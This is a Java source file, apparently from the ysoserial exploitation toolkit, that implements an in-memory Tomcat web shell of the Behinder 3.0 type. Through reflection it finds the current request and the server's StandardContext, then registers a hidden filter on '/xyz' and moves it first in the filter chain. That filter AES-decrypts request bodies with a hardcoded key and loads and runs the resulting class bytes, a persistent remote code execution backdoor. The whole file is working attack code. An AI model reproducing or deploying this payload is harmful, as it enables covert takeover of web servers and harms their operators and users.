package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;


public class TomcatFilterBehinder extends AbstractTranslet implements Filter{
    static {
    	try {

    		HttpServletRequest servletRequest =  getServletRequest();

                if (servletRequest != null) {

                	javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
                    org.apache.catalina.core.StandardContext standardContext = null;
                //判断是否已有该名字的filter，有则不再添加
                if (servletContext.getFilterRegistration("xyz") == null) {

                	//遍历出标准上下文对象
                    for (; standardContext == null; ) {
                    	java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
                        contextField.setAccessible(true);
                        Object o = contextField.get(servletContext);
                        if (o instanceof javax.servlet.ServletContext) {
                            servletContext = (javax.servlet.ServletContext) o;
                        } else if (o instanceof org.apache.catalina.core.StandardContext) {
                            standardContext = (org.apache.catalina.core.StandardContext) o;
                        }
                    }if (standardContext != null) {

                    	//修改状态，要不然添加不了
                        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                        stateField.setAccessible(true);
                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);

                      //创建一个自定义的Filter马
                        Filter xyz = new TomcatFilterBehinder();

                        //添加filter马
                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("xyz", xyz);
                        filterRegistration.setInitParameter("encoding", "utf-8");
                        filterRegistration.setAsyncSupported(false);
                        filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{"/xyz"});

                        //状态恢复，要不然服务不可用
                        if (stateField != null) {stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
                        }if (standardContext != null) {
//生效
                            java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                            filterStartMethod.setAccessible(true);
                            filterStartMethod.invoke(standardContext, null);
//把filter插到第一位
                            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
                            for (int i = 0; i < filterMaps.length; i++) {if (filterMaps[i].getFilterName().equalsIgnoreCase("xyz")) {org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];filterMaps[i] = filterMaps[0];
                                filterMaps[0] = filterMap;
                                break;}}}}}}} catch (Exception e) {e.printStackTrace();}
    }

    private static Object getFV(Object o, String s) throws Exception {
        java.lang.reflect.Field f = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        }
        f.setAccessible(true);
        return f.get(o);
}


    private  static HttpServletRequest getServletRequest() throws Exception{
        Object o;
        String s;
        HttpServletRequest request = null;
        HttpServletResponse response = null;

        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < ts.length; i++) {
            Thread t = ts[i];
            if (t == null) {
                continue;
            }
            s = t.getName();
            if (!s.contains("exec") && s.contains("http")) {
                o = getFV(t, "target");
                if (!(o instanceof Runnable)) {
                    continue;
                }

                try {
                    o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }

                java.util.List ps = (java.util.List) getFV(o, "processors");
                for (int j = 0; j < ps.size(); j++) {
                    Object p = ps.get(j);
                    o = getFV(p, "req");
                    Object conreq = o.getClass().getMethod("getNote", new Class[]{int.class}).invoke(o, new Object[]{new Integer(1)});
                    if (conreq.getClass().isArray()) {
                        Object[] data = (Object[])conreq;
                        request = (HttpServletRequest)data[0];
                        response = (HttpServletResponse)data[1];
                        return request;
                      } else {
                        try {
                          Class<?> clazz = Class.forName("javax.servlet.jsp.PageContext");
                          request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest", new Class[0]).invoke(conreq, new Object[0]);
                          response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse", new Class[0]).invoke(conreq, new Object[0]);
                          return request;
                        } catch (Exception var8) {
                          if (conreq instanceof HttpServletRequest) {
                            request = (HttpServletRequest)conreq;
                            return request;
                            }
                          }
                        }
                      }
                }
            }
		return request;
    }


    @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)throws TransletException {}
    @Override public void init(FilterConfig filterConfig) throws ServletException {}

    //定义冰蝎3.0的业务逻辑
    public String Pwd = "e45e329feb5d925b";


    public Class<?> g(byte []b) throws Exception, IllegalArgumentException, InvocationTargetException{
    	ClassLoader c = getClass().getClassLoader();
    	java.lang.reflect.Method m = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    	m.setAccessible(true);
      	return (Class<?>)m.invoke(c,b,0,b.length);
       }


    public byte[] base64Decode(String str) throws Exception {
    	    try {
    	      Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
    	      return (byte[])clazz.getMethod("decodeBuffer", new Class[] { String.class }).invoke(clazz.newInstance(), new Object[] { str });
    	    } catch (Exception e) {
    	      Class<?> clazz = Class.forName("java.util.Base64");
    	      Object decoder = clazz.getMethod("getDecoder", new Class[0]).invoke((Object)null, new Object[0]);
    	      return (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    	    }
    	  }


    @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,FilterChain filterChain) throws IOException, ServletException {
        HttpSession session = ((HttpServletRequest)servletRequest).getSession();
        Map<Object, Object> obj = new HashMap();
        obj.put("request", servletRequest);
        obj.put("response", servletResponse);
        obj.put("session", session);
        try {
          session.putValue("u", this.Pwd);
          Cipher c = Cipher.getInstance("AES");
          c.init(2, new SecretKeySpec(this.Pwd.getBytes(), "AES"));
          g(c.doFinal(base64Decode(servletRequest.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception e) {
          e.printStackTrace();
        }
      }
    @Override public void destroy() {}
}
